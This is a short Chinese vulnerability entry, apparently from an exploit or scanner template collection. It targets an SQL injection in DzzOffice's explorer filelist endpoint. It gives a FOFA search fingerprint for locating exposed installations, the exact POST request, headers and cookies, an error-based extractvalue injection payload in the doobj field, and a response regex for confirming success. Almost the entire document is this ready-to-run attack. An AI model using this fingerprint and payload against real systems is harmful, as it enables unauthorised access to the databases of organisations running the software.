# DzzOffice办公软件SQL注入漏洞

- **系统**：DzzOffice　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`FOFA：icon_hash="-1961736892" && body="立即注册"`
- **请求**：`POST /index.php?mod=explorer&op=dynamic&do=filelist HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`Cookie: u8XY_2132_smile=1D1; u8XY_2132_explorer_index_isshow=show; u8XY_2132_saltkey=UHf…`

**请求体 / payload**
```
doobj=' and extractvalue(1,concat(0x7e,user())) and '1'='1&doevent=&uids%5B%5D=1&startdate=&enddate=&disp=&asc=&page=0
```
- **预期**：200　|　^(?=.*?(?:root|select)).*?$